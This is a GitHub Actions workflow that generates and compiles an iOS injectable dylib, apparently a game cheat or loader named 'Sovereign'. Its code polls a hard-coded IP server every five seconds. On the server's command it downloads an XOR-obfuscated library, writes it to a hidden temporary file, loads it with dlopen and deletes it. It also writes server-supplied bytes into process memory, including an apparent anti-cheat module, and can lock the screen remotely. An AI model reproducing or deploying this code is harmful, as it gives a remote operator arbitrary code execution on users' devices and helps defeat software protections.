name: Sovereign-Pro-Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Generate and Compile Sovereign Core
        run: |
          # Generating Pure English Source Code to prevent YAML crashes
          cat << 'EOF' > main.mm
          #import <UIKit/UIKit.h>
          #import <mach-o/dyld.h>
          #import <mach/mach.h>
          #import <Foundation/Foundation.h>
          #import <objc/runtime.h>
          #import <dlfcn.h>
          #import <unistd.h>

          // [1] COMMAND CENTER COORDINATES
          // يا جنرال، ضع مسار ملف الـ PHP الخاص بك هنا
          #define SERVER_HOST @"http://16.171.230.58/dashboard_v120k.php"
          #define PAYLOAD_URL @"http://16.171.230.58/sovereign_payload.dylib"
          #define WSAM_KEY 0x57 

          static BOOL isPayloadInjected = NO;

          @interface SovereignEliteHUD : UIView
          @property (nonatomic, strong) UILabel *statusLabel;
          @property (nonatomic, strong) UIView *lamp;
          @end

          @implementation SovereignEliteHUD

          // =========================================================
          // [2] VOLATILE PAYLOAD (Triggered ONLY by Dashboard)
          // =========================================================
          - (void)igniteVolatilePulse {
              [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  if (!data || data.length < 100) return;
                  
                  uint8_t *buffer = (uint8_t *)[data bytes];
                  NSMutableData *dec = [NSMutableData dataWithLength:data.length];
                  uint8_t *dest = (uint8_t *)[dec mutableBytes];
                  for (NSUInteger i = 0; i < data.length; i++) { dest[i] = buffer[i] ^ WSAM_KEY; }

                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_pulse_wsam.dylib"];
                  [dec writeToFile:path atomically:YES];

                  void *h = dlopen([path UTF8String], RTLD_NOW);
                  if (h) {
                      isPayloadInjected = YES;
                      unlink([path UTF8String]); 
                      dispatch_async(dispatch_get_main_queue(), ^{
                          self.statusLabel.text = @"PAYLOAD INJECTED ✅";
                          self.statusLabel.textColor = [UIColor greenColor];
                      });
                  }
              }] resume];
          }

          // =========================================================
          // [3] DYNAMIC MEMORY PATCHER (Triggered ONLY by Dashboard)
          // =========================================================
          - (void)executePatches:(NSArray *)payloads {
              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
              uintptr_t anogsBase = 0;
              uint32_t count = _dyld_image_count();
              for (uint32_t i = 0; i < count; i++) {
                  const char *name = _dyld_get_image_name(i);
                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
              }

              mach_port_t task = mach_task_self();
              for (NSDictionary *patch in payloads) {
                  NSString *targetFile = patch[@"file_name"];
                  uintptr_t base = ([targetFile containsString:@"anogs"]) ? anogsBase : shadowBase;
                  if (base == 0) continue;

                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
                  uintptr_t targetAddr = base + addr;
                  NSString *hexStr = patch[@"hex_val"];
                  
                  NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
                  if ([cleanHex hasPrefix:@"0x"]) cleanHex = [cleanHex substringFromIndex:2];
                  
                  NSMutableData *data = [NSMutableData data];
                  for (int i = 0; i + 2 <= cleanHex.length; i += 2) {
                      unsigned int v; [[NSScanner scannerWithString:[cleanHex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
                      unsigned char c = (unsigned char)v; [data appendBytes:&c length:1];
                  }

                  kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                  if (kr == KERN_SUCCESS) {
                      vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
                      vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
                  }
              }
          }

          // =========================================================
          // [4] SLIM TACTICAL UI ENGINE (Fixed Top Bar)
          // =========================================================
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  // خلفية زجاجية أنيقة جداً
                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.75];
                  self.layer.cornerRadius = frame.size.height / 2; // حواف دائرية بالكامل
                  self.layer.borderColor = [[UIColor cyanColor] colorWithAlphaComponent:0.5].CGColor;
                  self.layer.borderWidth = 1.0;
                  self.clipsToBounds = YES;

                  // اللوجو (الاسم)
                  UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(15, 0, 70, frame.size.height)];
                  title.text = @"SOVEREIGN";
                  title.textColor = [UIColor cyanColor];
                  title.font = [UIFont boldSystemFontOfSize:11];
                  [self addSubview:title];

                  // الخط الفاصل
                  UIView *divider = [[UIView alloc] initWithFrame:CGRectMake(90, 5, 1, frame.size.height - 10)];
                  divider.backgroundColor = [[UIColor whiteColor] colorWithAlphaComponent:0.2];
                  [self addSubview:divider];

                  // نص الحالة (المتغير)
                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(100, 0, frame.size.width - 135, frame.size.height)];
                  self.statusLabel.text = @"SYNCING...";
                  self.statusLabel.textColor = [UIColor whiteColor];
                  self.statusLabel.font = [UIFont systemFontOfSize:11];
                  [self addSubview:self.statusLabel];

                  // اللمبة الذكية
                  self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, (frame.size.height - 10) / 2, 10, 10)];
                  self.lamp.backgroundColor = [UIColor orangeColor];
                  self.lamp.layer.cornerRadius = 5;
                  [self addSubview:self.lamp];

                  [self startSyncLoop];
                  // تم إزالة أكواد التحريك (Draggable) ليبقى ثابتاً كما طلبت
              }
              return self;
          }

          - (void)startSyncLoop {
              NSString *apiUrl = [NSString stringWithFormat:@"%@?api=true", SERVER_HOST];
              NSURLRequest *req = [NSURLRequest requestWithURL:[NSURL URLWithString:apiUrl] cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (err || !data) return;
                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                      if (!json) return;

                      // 1. Maintenance Lockdown Check
                      if ([json[@"maintenance"] intValue] == 1) { [self showLockdown:json[@"lock_msg"]]; return; }

                      // 2. Volatile Payload Trigger
                      if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }

                      // 3. Apply Patches
                      if (json[@"payload"]) { [self executePatches:json[@"payload"]]; }

                      self.statusLabel.text = json[@"notification"];
                      if ([json[@"status"] isEqualToString:@"safe"]) {
                          self.lamp.backgroundColor = [UIColor greenColor];
                          self.layer.borderColor = [[UIColor greenColor] colorWithAlphaComponent:0.5].CGColor;
                      } else {
                          self.lamp.backgroundColor = [UIColor redColor];
                          self.statusLabel.textColor = [UIColor redColor];
                          self.layer.borderColor = [[UIColor redColor] colorWithAlphaComponent:0.8].CGColor;
                      }
                  });
              }] resume];
              
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
          }

          - (void)showLockdown:(NSString *)m {
              UIWindow *win = nil;
              if (@available(iOS 13.0, *)) {
                  for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
                      if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
                  }
              }
              if (!win) win = [UIApplication sharedApplication].keyWindow;
              if ([win viewWithTag:2026]) return;
              UIView *v = [[UIView alloc] initWithFrame:win.bounds];
              v.tag = 2026; v.backgroundColor = [UIColor blackColor];
              UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
              l.text = [NSString stringWithFormat:@"🛑 SYSTEM MAINTENANCE:\n%@", m];
              l.textColor = [UIColor whiteColor]; l.textAlignment = NSTextAlignmentCenter;
              l.numberOfLines = 0; [v addSubview:l]; [win addSubview:v];
          }
          @end

          void __attribute__((constructor)) start_wsam_pro_slim() {
              // 12 seconds dormant state before waking up UI
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(12 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  UIWindow *win = nil;
                  if (@available(iOS 13.0, *)) {
                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
                          if (scene.activationState == UISceneActivationStateForegroundActive) { win = scene.windows.firstObject; break; }
                      }
                  }
                  if (!win) win = [UIApplication sharedApplication].keyWindow;
                  if (win) {
                      CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
                      // شريط نحيف جداً في أعلى المنتصف (عرض 280، ارتفاع 30)
                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake((screenWidth - 280) / 2, 45, 280, 30)];
                      [win addSubview:ui];
                  }
              });
          }
          EOF

          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Elite_Slim.dylib \
          -isysroot $SDK_PATH \
          -framework Foundation -framework UIKit -framework CoreGraphics \
          -fobjc-arc -Os -w -lc++

      - name: Upload Sovereign Dylib
        uses: actions/upload-artifact@v4
        with:
          name: Sovereign-Pro-v120k-Slim
          path: Sovereign_Elite_Slim.dylib
